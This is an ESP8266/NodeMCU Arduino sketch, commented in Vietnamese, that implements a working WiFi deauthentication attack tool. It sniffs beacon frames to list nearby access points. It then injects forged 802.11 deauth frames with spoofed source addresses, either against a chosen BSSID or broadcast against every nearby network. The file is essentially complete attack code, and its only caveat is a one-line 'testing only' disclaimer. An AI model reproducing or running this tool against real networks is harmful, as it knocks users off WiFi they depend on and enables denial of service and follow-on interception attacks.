#include <ESP8266WiFi.h>

extern "C" {
  #include "user_interface.h"
}

// Cấu trúc frame Deauthentication (type 0xC0)
uint8_t deauthFrame[26] = {
  0xC0, 0x00,                         // Type/Subtype: Deauthentication (0xC0)
  0x00, 0x00,                         // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver (broadcast cho broadcast deauth)
  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // Source (sẽ thay bằng BSSID giả hoặc thật)
  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (sẽ thay)
  0x00, 0x00,                         // Sequence/Fragment number
  0x07, 0x00                          // Reason Code: Class 3 frame from nonassociated STA (thường dùng 7)
};

bool scanning = false;
bool attacking = false;
uint8_t targetBSSID[6] = {0};  // BSSID mục tiêu (nếu targeted)

void setup() {
  Serial.begin(115200);
  delay(200);
  Serial.println("\n=== ESP8266 Deauth Scanner & Attacker (NodeMCU) ===");
  Serial.println("Chi dung cho muc dich test - khong dung sai phap luat!");

  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true);
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(1);           // Bật promiscuous mode để scan
  wifi_set_promiscuous_rx_cb(sniffer);  // Callback khi nhận gói tin
  wifi_set_channel(1);                  // Bắt đầu từ channel 1
}

void loop() {
  if (Serial.available()) {
    String cmd = Serial.readStringUntil('\n');
    cmd.trim();

    if (cmd == "scan") {
      scanning = true;
      attacking = false;
      Serial.println("Bat dau SCAN cac mang WiFi...");
    }
    else if (cmd.startsWith("deauth ")) {
      String bssidStr = cmd.substring(7);
      if (parseBSSID(bssidStr, targetBSSID)) {
        attacking = true;
        scanning = false;
        Serial.print("Bat dau DEAUTH targeted BSSID: ");
        printBSSID(targetBSSID);
        Serial.println();
      } else {
        Serial.println("Sai dinh dang BSSID! VD: deauth AA:BB:CC:DD:EE:FF");
      }
    }
    else if (cmd == "deauthall") {
      attacking = true;
      scanning = false;
      memset(targetBSSID, 0, 6);  // 00:00:00... → broadcast mode
      Serial.println("Bat dau DEAUTH BROADCAST (tat ca mang gan day)!");
    }
    else if (cmd == "stop") {
      attacking = false;
      scanning = false;
      Serial.println("Da dung tat ca!");
    }
  }

  if (scanning) {
    // Tự động nhảy channel để scan
    static uint8_t ch = 1;
    wifi_set_channel(ch);
    ch = (ch % 13) + 1;
    delay(50);
  }

  if (attacking) {
    sendDeauth();
    delay(10);  // Gửi liên tục, nhưng không quá nhanh để tránh treo
  }
}

// Callback khi nhận gói tin (dùng để scan AP)
void sniffer(uint8_t *buf, uint16_t len) {
  if (!scanning) return;

  // Kiểm tra nếu là Beacon frame (từ AP)
  if (len >= 36 && buf[0] == 0x80) {  // Beacon frame type
    uint8_t *bssid = &buf[16];       // BSSID ở offset 16 trong beacon
    uint8_t *ssid = &buf[37];        // SSID length ở offset 36+1, data ở 37
    uint8_t ssid_len = buf[36];

    Serial.print("AP: ");
    printBSSID(bssid);
    Serial.print(" | SSID: ");
    for (int i = 0; i < ssid_len; i++) Serial.print((char)ssid[i]);
    Serial.print(" | Ch: ");
    Serial.print(wifi_get_channel());
    Serial.println();
  }
}

// Gửi frame deauth
void sendDeauth() {
  uint8_t src[6];
  if (targetBSSID[0] == 0 && targetBSSID[1] == 0) {
    // Broadcast mode: source ngẫu nhiên
    for (int i = 0; i < 6; i++) src[i] = random(0, 256);
  } else {
    // Targeted: source = BSSID mục tiêu (giả làm AP)
    memcpy(src, targetBSSID, 6);
  }

  // Copy source vào frame
  memcpy(&deauthFrame[10], src, 6);
  // Copy BSSID (nếu targeted thì là target, broadcast thì fake)
  if (targetBSSID[0] != 0 || targetBSSID[1] != 0) {
    memcpy(&deauthFrame[16], targetBSSID, 6);
  } else {
    for (int i = 0; i < 6; i++) deauthFrame[16 + i] = random(0, 256);
  }

  // Gửi frame (sys_seq = 0 để tự xử lý sequence)
  wifi_send_pkt_freedom(deauthFrame, 26, 0);
}

// Parse BSSID từ string (AA:BB:CC:DD:EE:FF)
bool parseBSSID(String str, uint8_t *out) {
  str.toUpperCase();
  int idx = 0;
  for (int i = 0; i < 6; i++) {
    String part = str.substring(idx, idx + 2);
    if (part.length() != 2) return false;
    out[i] = (uint8_t) strtol(part.c_str(), NULL, 16);
    idx += 3;  // Bỏ dấu :
  }
  return true;
}

void printBSSID(uint8_t *b) {
  for (int i = 0; i < 6; i++) {
    if (b[i] < 16) Serial.print("0");
    Serial.print(b[i], HEX);
    if (i < 5) Serial.print(":");
  }
}
